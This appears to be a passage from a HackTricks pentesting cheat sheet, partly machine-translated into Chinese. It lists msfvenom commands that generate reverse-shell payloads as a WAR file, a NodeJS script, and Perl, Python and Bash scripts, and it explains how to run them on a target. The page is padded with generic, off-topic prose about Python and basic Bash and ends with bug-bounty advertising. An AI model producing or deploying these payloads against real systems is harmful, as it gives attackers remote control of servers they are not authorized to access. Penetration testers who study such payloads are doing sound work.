The **WAR** file format is commonly used in Java web applications. It stands for Web Application Archive and is essentially a compressed file that contains all the necessary files and resources for a web application to run.

One of the common uses of a WAR file is to deploy a web application on a server. However, it can also be used as a delivery mechanism for a reverse shell.

A **reverse shell** is a type of shell in which the target machine initiates a connection to the attacker's machine, allowing the attacker to execute commands on the target machine remotely. This can be useful in scenarios where the target machine is behind a firewall or has restricted outbound connections.

To create a reverse shell using a WAR file, you can use the `msfvenom` tool, which is part of the Metasploit Framework. The following command can be used to generate a WAR file with a reverse shell payload:

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

Replace `<attacker IP>` with the IP address of the attacker's machine and `<attacker port>` with the desired port for the reverse shell connection.

Once the `shell.war` file is generated, it can be deployed on a vulnerable server. When the server runs the WAR file, it will establish a reverse shell connection to the attacker's machine, providing the attacker with remote access to the server.

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，用于构建高性能的网络应用程序。它允许开发人员使用 JavaScript 在服务器端运行代码，而不仅仅局限于浏览器环境。NodeJS 提供了丰富的内置模块和工具，使开发人员能够轻松地构建可扩展的网络应用程序。

#### 使用 Metasploit 生成恶意 NodeJS 脚本

Metasploit 是一个功能强大的渗透测试框架，可以用于生成各种类型的恶意脚本。使用 Metasploit 的 msfvenom 工具，我们可以生成恶意的 NodeJS 脚本。

以下是使用 msfvenom 生成恶意 NodeJS 脚本的示例命令：

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f raw > malicious.js
```

在上面的命令中，我们使用了 `nodejs/shell_reverse_tcp` payload，它会在目标系统上创建一个反向 TCP shell。我们需要将 `<attacker IP>` 替换为攻击者的 IP 地址，将 `<attacker port>` 替换为攻击者监听的端口号。生成的恶意脚本将保存在 `malicious.js` 文件中。

#### 运行恶意 NodeJS 脚本

要在目标系统上运行恶意 NodeJS 脚本，我们需要确保目标系统上已安装 NodeJS 运行时环境。然后，我们可以使用以下命令运行恶意脚本：

```bash
node malicious.js
```

运行恶意脚本后，它将尝试与攻击者的 IP 地址和端口建立反向 TCP 连接。一旦连接建立成功，攻击者将能够远程控制目标系统，并执行各种操作。

#### 防御措施

为了防止恶意 NodeJS 脚本的攻击，我们可以采取以下防御措施：

- 及时更新 NodeJS 运行时环境和相关模块，以修复已知的漏洞。
- 仅从受信任的来源下载和安装 NodeJS 模块。
- 使用防火墙和入侵检测系统来监控网络流量，并阻止恶意连接。
- 限制 NodeJS 进程的权限，确保其仅具有必要的权限。
- 定期进行安全审计和漏洞扫描，以及对系统进行补丁和更新。

通过采取这些防御措施，我们可以减少恶意 NodeJS 脚本对系统的威胁，并提高系统的安全性。
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **脚本语言负载**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python（Python语言）**

Python is a high-level programming language that is widely used for its simplicity and readability. It is known for its clear and concise syntax, making it easy to learn and understand. Python supports multiple programming paradigms, including procedural, object-oriented, and functional programming. It has a large standard library that provides a wide range of modules and functions for various tasks.

Python is often used in the field of hacking due to its versatility and extensive libraries. It can be used for tasks such as web scraping, network scanning, exploit development, and automation. Python also has powerful frameworks and libraries, such as Scapy for packet manipulation, BeautifulSoup for HTML parsing, and Requests for HTTP requests.

Python is platform-independent, meaning that it can run on various operating systems, including Windows, macOS, and Linux. It has a large and active community that contributes to its development and provides support through forums, documentation, and online resources.

To run Python code, you need to have the Python interpreter installed on your system. The interpreter can be downloaded from the official Python website and is available for free. Once installed, you can write Python code in a text editor and save it with the .py extension. The code can then be executed by running the Python interpreter with the script file as an argument.

Python is a versatile and powerful language that is widely used in the hacking community. Its simplicity, readability, and extensive libraries make it an excellent choice for various hacking tasks.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash（命令行解释器）**

Bash（Bourne Again SHell）是一种常用的命令行解释器，也是许多Linux和Unix系统的默认解释器。它提供了一种与操作系统进行交互的方式，可以执行命令、运行脚本和管理文件系统等操作。

#### **基本用法**

以下是一些常用的Bash命令：

- `ls`：列出当前目录中的文件和文件夹。
- `cd`：切换到指定目录。
- `pwd`：显示当前工作目录的路径。
- `mkdir`：创建一个新的目录。
- `rm`：删除文件或目录。
- `cp`：复制文件或目录。
- `mv`：移动文件或目录。
- `cat`：显示文件的内容。
- `grep`：在文件中搜索指定的模式。
- `chmod`：修改文件或目录的权限。

#### **脚本编写**

Bash还可以用于编写脚本，以自动化执行一系列命令。以下是一个简单的Bash脚本示例：

```bash
#!/bin/bash

# 输出当前日期和时间
echo "当前日期和时间："
date

# 列出当前目录中的文件和文件夹
echo "当前目录中的文件和文件夹："
ls
```

要运行脚本，可以使用以下命令：

```bash
bash script.sh
```

#### **环境变量**

Bash使用环境变量来存储系统和用户的配置信息。以下是一些常用的环境变量：

- `PATH`：指定可执行文件的搜索路径。
- `HOME`：当前用户的主目录。
- `USER`：当前用户名。
- `PS1`：命令行提示符的格式。

可以使用以下命令来查看和设置环境变量：

- 查看环境变量：`echo $VARIABLE_NAME`
- 设置环境变量：`export VARIABLE_NAME=value`

#### **管道和重定向**

Bash支持管道和重定向操作，以便将命令的输出发送到其他命令或文件中。以下是一些常用的管道和重定向操作符：

- `|`：将一个命令的输出发送到另一个命令。
- `>`：将命令的输出重定向到文件（覆盖原有内容）。
- `>>`：将命令的输出追加到文件末尾。
- `<`：将文件的内容作为命令的输入。
- `2>`：将命令的错误输出重定向到文件。

#### **总结**

Bash是一种强大而灵活的命令行解释器，可以用于执行命令、编写脚本和管理系统。掌握Bash的基本用法和常用技巧对于进行渗透测试和系统管理非常有帮助。
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof 是所有加密漏洞赏金的家园。**

**无需等待即可获得奖励**\
HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在 web3 渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的时代掌握 web3 安全。

**成为 web3 黑客传奇**\
每次验证的漏洞都会获得声誉积分，并登上每周排行榜的榜首。

[**在 HackenProof 上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在一家**网络安全公司**工作吗？您想在 HackTricks 中看到您的**公司广告**吗？或者您想获得**PEASS 的最新版本或下载 PDF 格式的 HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>
